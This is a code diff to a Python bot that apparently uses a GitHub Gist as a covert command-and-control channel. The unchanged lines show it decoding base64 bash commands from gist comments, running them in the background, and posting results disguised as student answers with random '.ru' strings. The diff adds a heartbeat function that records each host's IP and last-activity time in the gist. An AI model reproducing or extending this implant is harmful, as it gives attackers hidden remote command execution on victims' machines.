@@ -15,6 +15,7 @@ class Git:
     def __init__(self, github_gist_api, api_token):
         self.GITHUB_GIST_API = github_gist_api
         self.API_TOKEN = api_token
+        self.log_file = "log"
         self.gist_id = ""
 
     def dont_have_gist(self):
@@ -40,6 +41,37 @@ class Git:
             print("Unable to find gist " + gist_name + ".")
             return
         print("Using gist with id: " + self.gist_id)
+
+    def log_hearbeat(self, id):
+        url = self.GITHUB_GIST_API + "/" + self.gist_id
+        headers = {'Authorization': 'token %s' % self.API_TOKEN}
+        try_again = True
+        while try_again:
+            timestamp = datetime.utcnow().strftime(date_format)
+            res = requests.get(url, headers=headers)
+            if res.status_code != 200:
+                self.gist_id = ""
+                return
+            files = json.loads(res.text)["files"]
+            file = files["log"]
+            logs = json.loads(file["content"])
+            logs[id] = {"last_activity": timestamp}
+
+            payload = {"files": {self.log_file: {"content": json.dumps(logs, indent=2)}}}
+            res = requests.patch(url, headers=headers, data=json.dumps(payload))
+            if res.status_code != 200:
+                print("Unable to update gist. Statu code " + str(res.status_code))
+            if res.status_code == 404:
+                self.gist_id = ""
+            res = requests.get(url, headers=headers)
+            if res.status_code != 200:
+                self.gist_id = ""
+                return
+            files = json.loads(res.text)["files"]
+            file = files["log"]
+            logs = json.loads(file["content"])
+            if logs[id] == {"last_activity": timestamp}:
+                try_again = False
 
     def add_comment_to_gist(self, content):
         headers = {'Authorization': 'token %s' % self.API_TOKEN}
@@ -147,7 +179,7 @@ def execute_command_task(git, message):
     comment_message += "\n\nStudent with id " + ip + " answered: \n"
     comment_message += generate_random_string(8)
     comment_message += ".ru\n\n"
-    bash_command = str(base64.b64decode(message[3].split()[3]).decode("utf-8"))+" &"
+    bash_command = str(base64.b64decode(message[3].split()[3]).decode("utf-8")) + " &"
     try:
         output, error = execute_command(bash_command)
     except:
@@ -172,7 +204,7 @@ if __name__ == '__main__':
         while git_instance.dont_have_gist():
             git_instance.get_and_set_gist_id(gist_name)
             time.sleep(5)
-
+        git_instance.log_hearbeat(ip)
         new_comments = []
         for comment in git_instance.get_gist_comments():
             if datetime.strptime(comment['updated_at'], date_format) > last_comment_check \
